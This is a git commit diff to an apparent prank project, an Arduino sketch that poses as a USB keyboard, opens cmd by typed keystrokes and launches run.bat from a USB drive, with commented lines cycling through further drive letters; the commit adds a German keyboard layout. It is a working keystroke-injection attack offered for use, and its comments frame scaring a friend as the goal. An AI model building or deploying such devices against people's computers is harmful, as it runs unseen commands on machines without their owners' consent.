de3e94055095ed1c5bf5231e6b6ab8cd3c7c4356
Nyamogus <191276298+Nyamogus@users.noreply.github.com>
2025-04-19 18:28:00 +0200

    Update and rename Arduino.ino to Arduino_German.ino

--- Arduino_German.ino
+++ Arduino_German.ino
@@ -5,7 +5,7 @@ int Killswitch = 2;       // It's recommended to solder a jumper to Pin 2 to pre
 void setup() 
 {
   pinMode(Killswitch, INPUT_PULLUP);
-  Keyboard.begin();
+  Keyboard.begin(KeyboardLayout_de_DE);    // Change Keyboard layout according to your Computer
 }
 
 void loop() 
@@ -21,11 +21,14 @@ void loop()
   Keyboard.println("cmd");      // Lanch cmd
   delay(500);                   // Wait for cmd to start up (Increase if you're using Potato PCs)
   // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
-  Keyboard.print("D");              // Type USB drive letter into cmd
-  Keyboard.press(KEY_LEFT_SHIFT);   // Press Shift 
-  Keyboard.press('.');              // Type ":" into cmd
-  delay(100);
-  Keyboard.releaseAll();
+  Keyboard.println("D:");           // Type USB drive letter into cmd
   Keyboard.println("run.bat");      //start run.bat
+  // Optionally uncomment the lines below if your computer uses multiple drives. The drive letter should always be one more than the computer alreade has
+  //Keyboard.println("E:");
+  //Keyboard.println("run.bat");
+  //Keyboard.println("F:");
+  //Keyboard.println("run.bat");
+  //Keyboard.println("G:");
+  //Keyboard.println("run.bat");
   delay(1000);    // Your time to laugh as you just scared your friend
 }
